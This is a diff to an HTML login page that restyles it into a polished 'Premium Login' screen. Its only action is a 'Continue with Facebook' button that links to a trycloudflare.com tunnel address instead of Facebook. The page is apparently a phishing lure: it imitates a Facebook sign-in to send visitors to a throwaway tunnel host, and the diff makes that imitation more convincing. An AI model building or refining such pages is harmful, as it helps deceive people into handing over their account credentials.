@@ -1,104 +1,134 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Login Page</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #e9efff, #f7f9ff);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
+<meta charset="UTF-8">
+<title>Premium Login</title>
 
-        .container {
-            width: 360px;
-            background: #fff;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
-            padding: 25px;
-            text-align: center;
-        }
+<!-- Google Font -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
 
-        .header h1 {
-            margin: 0;
-            color: #333;
-        }
+<style>
+* {
+    box-sizing: border-box;
+    font-family: 'Poppins', sans-serif;
+}
 
-        .header p {
-            color: #666;
-            font-size: 14px;
-            margin-top: 8px;
-        }
+body {
+    margin: 0;
+    height: 100vh;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
 
-        .card {
-            margin: 20px 0;
-            padding: 15px;
-            background: #f5f7ff;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #444;
-        }
+/* Glass Card */
+.container {
+    width: 380px;
+    padding: 30px;
+    border-radius: 16px;
+    background: rgba(255, 255, 255, 0.18);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+    text-align: center;
+    color: #fff;
+    animation: fadeIn 0.8s ease;
+}
 
-        .fb-link {
-            text-decoration: none;
-        }
+@keyframes fadeIn {
+    from {
+        opacity: 0;
+        transform: translateY(20px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
 
-        .fb-button {
-            width: 100%;
-            background: #1877f2;
-            color: #fff;
-            border: none;
-            padding: 12px;
-            font-size: 15px;
-            border-radius: 6px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
+.header h1 {
+    margin: 0;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+}
 
-        .fb-button:hover {
-            background: #145fd1;
-        }
+.header p {
+    margin-top: 6px;
+    font-size: 14px;
+    opacity: 0.85;
+}
 
-        .footer {
-            margin-top: 18px;
-            font-size: 12px;
-            color: #888;
-        }
-    </style>
+/* Info Card */
+.card {
+    margin: 22px 0;
+    padding: 16px;
+    background: rgba(255,255,255,0.15);
+    border-radius: 10px;
+    font-size: 14px;
+    line-height: 1.6;
+}
+
+/* Button */
+.fb-link {
+    text-decoration: none;
+}
+
+.fb-button {
+    width: 100%;
+    padding: 14px;
+    border-radius: 10px;
+    border: none;
+    background: linear-gradient(135deg, #1877f2, #0f5bd8);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 10px 20px rgba(24,119,242,0.4);
+}
+
+.fb-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 15px 30px rgba(24,119,242,0.55);
+}
+
+.fb-button:active {
+    transform: scale(0.98);
+}
+
+/* Footer */
+.footer {
+    margin-top: 22px;
+    font-size: 12px;
+    opacity: 0.7;
+}
+</style>
 </head>
+
 <body>
 
-    <div class="container">
-
-        <div class="header">
-            <h1>Welcome</h1>
-            <p>Please login to continue</p>
-        </div>
-
-        <div class="card">
-            Welcome to our new jeaurney , let drive into the new world , for further lets cunnect your account 
-        </div>
-
-        <!-- Link wrapped button -->
-        <a href="https://ampland-pill-known-actual.trycloudflare.com" class="fb-link">
-            <button class="fb-button">
-                Login with Facebook to continue
-            </button>
-        </a>
-
-        <div class="footer">
-            © 2026 Demo Website. All rights reserved.
-        </div>
-
+<div class="container">
+    <div class="header">
+        <h1>Welcome Back</h1>
+        <p>Sign in to continue your journey</p>
     </div>
+
+    <div class="card">
+        Step into the future with us.  
+        Connect your account and explore a new digital experience.
+    </div>
+
+    <a href="https://ampland-pill-known-actual.trycloudflare.com" class="fb-link">
+        <button class="fb-button">
+            Continue with Facebook
+        </button>
+    </a>
+
+    <div class="footer">
+        © 2026 Demo Website. All rights reserved.
+    </div>
+</div>
 
 </body>
 </html>
-
